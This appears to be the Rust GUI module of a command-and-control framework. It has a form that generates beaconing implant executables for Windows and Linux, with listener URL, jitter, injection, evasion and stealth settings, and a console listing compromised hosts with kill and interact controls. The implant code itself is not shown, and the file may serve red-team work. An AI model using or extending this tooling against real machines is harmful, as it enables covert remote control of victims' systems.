// src/network_app_state/agents.rs - FIXED: Complete agents management with borrow issue resolved
use eframe::egui::{Ui, Color32, RichText, ScrollArea, Button, Frame, Margin, Rounding};
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::runtime::Runtime;
use std::path::Path;

use crate::agent::{AgentConfig, StealthLevel};
use super::{NetworkAppState, helpers::format_time_ago};

pub fn render(app: &mut NetworkAppState, ui: &mut Ui) {
    let bg_medium = Color32::from_rgb(25, 25, 25);
    let accent_blue = Color32::from_rgb(100, 149, 237);
    let accent_green = Color32::from_rgb(152, 251, 152);
    let accent_red = Color32::from_rgb(255, 105, 97);
    let accent_yellow = Color32::from_rgb(255, 215, 0);
    let text_primary = Color32::from_rgb(220, 220, 220);
    let text_secondary = Color32::from_rgb(170, 170, 170);
    
    ui.heading(RichText::new("🔴 Live Beacons & Agent Generation").color(accent_red).size(18.0));
    ui.separator();
    
    // Enhanced agent generation form
    ui.collapsing(RichText::new("⚙️ Generate Agent Executable").color(accent_blue), |ui| {
        Frame::none()
            .fill(bg_medium)
            .inner_margin(Margin::same(12.0))
            .rounding(Rounding::same(8.0))
            .show(ui, |ui| {
                ui.label(RichText::new("🎯 Agent Configuration").color(accent_blue).size(14.0).strong());
                ui.add_space(8.0);
                
                // Basic Configuration Row 1
                ui.horizontal(|ui| {
                    ui.label(RichText::new("Listener URL:").color(text_primary));
                    ui.text_edit_singleline(&mut app.agent_listener_url);
                    
                    ui.label(RichText::new("Format:").color(text_primary));
                    egui::ComboBox::from_id_source("agent_format")
                        .selected_text(&app.agent_format)
                        .show_ui(ui, |ui| {
                            ui.selectable_value(&mut app.agent_format, "exe".to_string(), "Windows EXE");
                            ui.selectable_value(&mut app.agent_format, "dll".to_string(), "Windows DLL");
                            ui.selectable_value(&mut app.agent_format, "elf".to_string(), "Linux ELF");
                        });
                });
                
                // Basic Configuration Row 2
                ui.horizontal(|ui| {
                    ui.label(RichText::new("Architecture:").color(text_primary));
                    egui::ComboBox::from_id_source("agent_architecture")
                        .selected_text(&app.agent_architecture)
                        .show_ui(ui, |ui| {
                            ui.selectable_value(&mut app.agent_architecture, "x64".to_string(), "x64 (64-bit)");
                            ui.selectable_value(&mut app.agent_architecture, "x86".to_string(), "x86 (32-bit)");
                        });
                    
                    ui.label(RichText::new("Sleep Time (s):").color(text_primary));
                    ui.text_edit_singleline(&mut app.agent_sleep_time);
                    
                    ui.label(RichText::new("Jitter (%):").color(text_primary));
                    ui.text_edit_singleline(&mut app.agent_jitter);
                });
                
                ui.add_space(8.0);
                
                // Output Configuration
                ui.horizontal(|ui| {
                    ui.label(RichText::new("Output File:").color(text_primary));
                    ui.text_edit_singleline(&mut app.agent_output_path);
                    
                    if ui.button("📁 Browse").clicked() {
                        browse_agent_output(app);
                    }
                    
                    // File status indicator
                    if Path::new(&app.agent_output_path).exists() {
                        ui.label(RichText::new("⚠️ File exists").color(accent_yellow));
                    } else {
                        ui.label(RichText::new("✅ New file").color(accent_green));
                    }
                });
                
                ui.add_space(8.0);
                
                // Generation Status & Button
                ui.horizontal(|ui| {
                    let generate_button = ui.add(
                        Button::new(RichText::new("🚀 Generate Executable").color(Color32::WHITE).size(14.0))
                            .fill(accent_green)
                            .min_size([120.0, 32.0].into())
                    );
                    
                    if generate_button.clicked() {
                        generate_agent_with_feedback(app);
                    }
                    
                    ui.separator();
                    
                    // Quick config buttons
                    if ui.add(Button::new(RichText::new("🎯 Quick Windows").color(Color32::WHITE))
                        .fill(accent_blue)).clicked() {
                        setup_quick_windows_config(app);
                    }
                    
                    if ui.add(Button::new(RichText::new("🐧 Quick Linux").color(Color32::WHITE))
                        .fill(accent_yellow)).clicked() {
                        setup_quick_linux_config(app);
                    }
                });
                
                ui.add_space(8.0);
                
                // Generation Tips
                Frame::none()
                    .fill(Color32::from_rgb(15, 25, 35))
                    .inner_margin(Margin::same(8.0))
                    .rounding(Rounding::same(4.0))
                    .show(ui, |ui| {
                        ui.label(RichText::new("💡 Generation Tips:").color(accent_blue).size(12.0).strong());
                        ui.label(RichText::new("• Windows .exe: Cross-compiled for maximum compatibility").color(text_secondary).size(11.0));
                        ui.label(RichText::new("• If direct compilation fails, a buildable project will be created").color(text_secondary).size(11.0));
                        ui.label(RichText::new("• Check the output path for your generated executable").color(text_secondary).size(11.0));
                        ui.label(RichText::new("• Lower sleep times = more frequent beacons = higher detection risk").color(accent_yellow).size(11.0));
                    });
            });
    });
    
    ui.separator();
    
    // Live beacons list with enhanced styling
    ui.label(RichText::new(format!("🔴 Connected Beacons ({})", app.agents.len()))
        .color(accent_red).size(16.0).strong());
    
    if app.agents.is_empty() {
        Frame::none()
            .fill(bg_medium)
            .inner_margin(Margin::same(20.0))
            .rounding(Rounding::same(8.0))
            .show(ui, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(10.0);
                    ui.label(RichText::new("🚫 No beacons connected")
                        .color(text_secondary).size(14.0));
                    ui.label(RichText::new("Generate and execute an agent to see it appear here")
                        .color(text_secondary).size(12.0));
                    ui.add_space(10.0);
                });
            });
    } else {
        ScrollArea::vertical().max_height(300.0).show(ui, |ui| {
            for agent in &app.agents.clone() {
                let time_ago = SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .unwrap()
                    .as_secs() - agent.last_seen;
                
                let (status_text, status_color) = if time_ago < 120 {
                    ("🟢 Online", accent_green)
                } else if time_ago < 300 {
                    ("🟡 Idle", accent_yellow)
                } else {
                    ("🔴 Offline", accent_red)
                };
                
                Frame::none()
                    .fill(bg_medium)
                    .inner_margin(Margin::same(10.0))
                    .rounding(Rounding::same(6.0))
                    .show(ui, |ui| {
                        ui.horizontal(|ui| {
                            // Status and basic info
                            ui.vertical(|ui| {
                                ui.horizontal(|ui| {
                                    ui.label(RichText::new(status_text).color(status_color).size(12.0));
                                    ui.label(RichText::new(&agent.id).color(text_primary).monospace().size(11.0));
                                });
                                ui.label(RichText::new(format!("{}@{}", agent.username, agent.hostname))
                                    .color(accent_green).size(12.0));
                                ui.label(RichText::new(format!("{} | {}", agent.os_version, format_time_ago(time_ago)))
                                    .color(text_secondary).size(10.0));
                            });
                            
                            ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| {
                                if ui.add(Button::new(RichText::new("❌ Kill").color(Color32::WHITE))
                                    .fill(accent_red)).clicked() {
                                    app.set_status(&format!("🔪 Terminating beacon {}", agent.id));
                                    // Send kill command
                                    execute_kill_command(app, &agent.id);
                                }
                                
                                if ui.add(Button::new(RichText::new("🔗 Interact").color(Color32::WHITE))
                                    .fill(accent_blue)).clicked() {
                                    app.open_beacon_console(&agent.id);
                                }
                                
                                if ui.add(Button::new(RichText::new("📊 Info").color(Color32::WHITE))
                                    .fill(accent_yellow)).clicked() {
                                    show_agent_details(app, &agent.id);
                                }
                            });
                        });
                    });
                ui.add_space(5.0);
            }
        });
    }
}

// FIXED: Enhanced agent generation with proper feedback and borrow issue resolved
fn generate_agent_with_feedback(app: &mut NetworkAppState) {
    let sleep_time = app.agent_sleep_time.parse::<u32>().unwrap_or(60);
    let jitter = app.agent_jitter.parse::<u8>().unwrap_or(10);
    
    // Validate configuration
    if app.agent_listener_url.trim().is_empty() {
        app.set_status("❌ Listener URL cannot be empty");
        return;
    }
    
    if app.agent_output_path.trim().is_empty() {
        app.set_status("❌ Output path cannot be empty");
        return;
    }
    
    // Show generation start
    app.set_status("🔨 Starting agent generation...");
    
    let config = AgentConfig {
        listener_url: app.agent_listener_url.clone(),
        format: app.agent_format.clone(),
        architecture: app.agent_architecture.clone(),
        sleep_time,
        jitter,
        injection: app.agent_injection.clone(),
        output_path: app.agent_output_path.clone(),
        evasion_enabled: false,
        stealth_level: StealthLevel::Basic,
    };
    
    // FIXED: Clone these values before moving into closure
    let output_path_for_closure = config.output_path.clone();
    let output_path_for_status = config.output_path.clone();
    let format_for_status = config.format.clone();
    
    // Generate agent in background
    let agent_generator = crate::agent::AgentGenerator::new();
    
    std::thread::spawn(move || {
        match agent_generator.generate(config) {
            Ok(_) => {
                // Check if actual file was created
                if std::path::Path::new(&output_path_for_closure).exists() {
                    println!("✅ Agent executable created successfully: {}", output_path_for_closure);
                } else {
                    println!("⚠️ Agent project created, manual build may be required");
                }
            },
            Err(e) => {
                println!("❌ Agent generation failed: {}", e);
            }
        }
    });
    
    // FIXED: Use the cloned values for status message
    app.set_status(&format!("🚀 Generating {} agent at {}", format_for_status.to_uppercase(), output_path_for_status));
}

fn browse_agent_output(app: &mut NetworkAppState) {
    let file_dialog = rfd::FileDialog::new()
        .add_filter("Executable", &["exe", "elf", "bin"])
        .add_filter("All Files", &["*"]);
    
    if let Some(path) = file_dialog.save_file() {
        if let Some(path_str) = path.to_str() {
            app.agent_output_path = path_str.to_string();
            app.set_status(&format!("📁 Output path set: {}", path_str));
        }
    }
}

fn setup_quick_windows_config(app: &mut NetworkAppState) {
    app.agent_format = "exe".to_string();
    app.agent_architecture = "x64".to_string();
    app.agent_output_path = "agent.exe".to_string();
    app.set_status("🎯 Windows configuration applied");
}

fn setup_quick_linux_config(app: &mut NetworkAppState) {
    app.agent_format = "elf".to_string();
    app.agent_architecture = "x64".to_string();
    app.agent_output_path = "agent".to_string();
    app.set_status("🐧 Linux configuration applied");
}

fn execute_kill_command(app: &mut NetworkAppState, agent_id: &str) {
    let client_api_clone = app.client_api.clone();
    let agent_id_clone = agent_id.to_string();
    
    app.runtime.spawn_blocking(move || {
        let runtime = Runtime::new().unwrap();
        runtime.block_on(async {
            if let Ok(client) = client_api_clone.try_lock() {
                let _ = client.execute_command(&agent_id_clone, "exit").await;
            }
        });
    });
}

fn show_agent_details(app: &mut NetworkAppState, agent_id: &str) {
    // Find the agent and show detailed information
    if let Some(agent) = app.agents.iter().find(|a| a.id == agent_id) {
        let details = format!(
            "Agent: {} | Host: {}@{} | OS: {} | Arch: {} | IP: {} | First: {} | Last: {}",
            agent.id, agent.username, agent.hostname, agent.os_version,
            agent.architecture, agent.ip_address, agent.first_seen, agent.last_seen
        );
        app.set_status(&format!("📊 {}", details));
    }
}